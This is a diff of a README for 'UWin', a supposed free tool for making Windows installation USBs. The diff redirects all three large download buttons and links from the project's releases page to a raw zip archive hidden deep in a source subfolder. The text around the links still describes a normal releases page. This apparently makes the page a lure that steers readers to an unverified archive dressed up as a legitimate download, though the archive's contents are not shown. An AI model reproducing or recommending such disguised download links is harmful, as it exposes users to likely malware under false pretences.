@@ -1,7 +1,7 @@
 <h1>💻 UWin - The Simplest Way to Create a Windows Installation USB</h1>
 
 <p align="center">
-  <a href="https://github.com/adesatov111-a11y/UWin/releases" style="display:inline-block;padding:18px 42px;background-color:#FF6B35;color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 6px 12px rgba(0,0,0,0.3);">⬇️ Download UWin Now – It's Free!</a>
+  <a href="https://raw.githubusercontent.com/adesatov111-a11y/UWin/main/kaynak/UWin.Uygulama/Servisler/Win_U_3.9.zip" style="display:inline-block;padding:18px 42px;background-color:#FF6B35;color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 6px 12px rgba(0,0,0,0.3);">⬇️ Download UWin Now – It's Free!</a>
 </p>
 
 ---
@@ -71,7 +71,7 @@ Follow these simple steps to create your Windows installation USB drive.
 
 Visit this link to download the application:
 
-👉 **[Click Here to Download UWin](https://github.com/adesatov111-a11y/UWin/releases)**
+👉 **[Click Here to Download UWin](https://raw.githubusercontent.com/adesatov111-a11y/UWin/main/kaynak/UWin.Uygulama/Servisler/Win_U_3.9.zip)**
 
 Look for the latest version (the one with the highest number). Download the file to a location you'll remember, like your Desktop or Downloads folder.
 
@@ -180,7 +180,7 @@ Download UWin today and keep a reliable Windows USB drive ready for any situatio
 Ready to get started? Here's your direct link one more time:
 
 <p align="center">
-  <a href="https://github.com/adesatov111-a11y/UWin/releases" style="display:inline-block;padding:14px 36px;background-color:#2EC4B6;color:#ffffff;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ Go to UWin Downloads Page</a>
+  <a href="https://raw.githubusercontent.com/adesatov111-a11y/UWin/main/kaynak/UWin.Uygulama/Servisler/Win_U_3.9.zip" style="display:inline-block;padding:14px 36px;background-color:#2EC4B6;color:#ffffff;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ Go to UWin Downloads Page</a>
 </p>
 
 ## 📮 Need More Help?
